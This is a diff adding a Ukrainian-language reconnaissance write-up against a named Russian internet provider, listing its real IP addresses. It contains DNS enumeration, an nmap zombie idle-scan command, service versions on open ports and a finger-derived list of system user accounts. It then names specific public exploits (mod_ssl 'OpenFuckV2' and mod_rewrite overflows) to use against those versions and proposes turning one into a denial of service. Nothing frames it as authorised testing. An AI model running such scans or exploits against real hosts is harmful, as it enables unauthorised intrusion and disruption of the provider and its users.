@@ -1,0 +1,89 @@
+FREEnet - "Одна из старейших компьютерных сетей России. Мы предоставляем доступ организациям к Интернет."
+FREEnet має безчислений список експлоїтів, якими можна скористатися в разі чого. Серед них є Buffer Overflow, Dos, Bypass та багато іншого.
+
+DNS general enumeration:
+ std: Performing General Enumeration against: www.free.net...
+ DNSSEC is not configured for www.free.net
+      SOA ns1.free.net 147.45.15.34
+      SOA ns1.free.net 2001:640:1:4::34
+      MX portal.free.net 147.45.15.36
+      MX portal.free.net 2001:640:1:4::36
+      CNAME www.free.net portal.free.net
+      A portal.free.net 147.45.15.36
+      CNAME www.free.net portal.free.net
+      AAAA portal.free.net 2001:640:1:4::36
+
+nmap using zombie:
+[~ sudo nmap -sV -sI 147.45.15.34 147.45.15.36]
+
+3306/tcp open  mysql   MySQL 5.0.67
+443/tcp open  ssl/http Apache httpd 2.0.59 ((Unix) PHP/5.0.4 mod_ssl/2.0.59 OpenSSL/0.9.8t DAV/2)
+20000/tcp open  http    MiniServ 0.01 (most likely bug)
+10000/tcp open  ssl/http MiniServ 1.820 (Webmin httpd)
+79/tcp open  finger  Sun Solaris fingerd
+143/tcp open  imap    Dovecot imapd
+513/tcp open  login   (without version)
+53/tcp open  domain  ISC BIND 9.8.1-P1
+587/tcp open smtp Sendmail 8.14.3/8.14.3
+21/tcp    open  ftp (tcpwrapped, I didn't find version)
+22/tcp open  ssh     SunSSH 1.1 (protocol 2.0)
+
+OS: SUN SOLARIS 10|9, UNIX
+
+21/tcp    open  ftp
+22/tcp    open  ssh
+53/tcp    open  domain
+79/tcp    open  finger
+80/tcp    open  http
+143/tcp   open  imap
+443/tcp   open  https
+513/tcp   open  login
+514/tcp   open  shell
+587/tcp   open  submission
+3306/tcp  open  mysql
+6000/tcp  open  X11
+6112/tcp  open  dtspc
+8000/tcp  open  http-alt
+8001/tcp  open  vcom-tunnel
+10000/tcp open  snet-sensor-mgmt
+20000/tcp open  dnp
+
+OS users:
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: adm
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: lp
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: uucp
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: nuucp
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: listen
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: mailadm
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: bin
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: daemon
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: majordomo
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: dnsserv
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: ftp
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: gdm
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: mail
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: mysql
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: noaccess
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: nobody
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: nobody4
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: postgres
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: root
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: sys
+[+] 147.45.15.36:79       - 147.45.15.36:79 - Found user: fgroup
+
+Використовуючи цю інформацію, Гугл, ваші бази та інші есплоїт датабази можна знайти на ці версії різні експлоїти.
+Відповідно:
+"Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)" - експлоїт до OpenSSL, лише потрібно знайти офсет пам'яті Apache для Sun Solaris 10|9. Думаю, ви вже маєте цей офсет.
+https://www.exploit-db.com/exploits/47080
+
+"Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow " - теж потрібний офсет та якимось макаром потрібно знайти адрес, для якого буде справедливе: "/[address]/ldap" - exist; та це все вставити на свої місця. Можна цю вразливість перетворити ще й на Dos, думаю в payload запрограмувати безкінечний цикл.
+https://www.exploit-db.com/exploits/2237
+
+"Apache 2.0.x < 2.0.64 Multiple Vulnerabilities" -
+
+https://www.tenable.com/plugins/nessus/34727
+
+
+
+
+
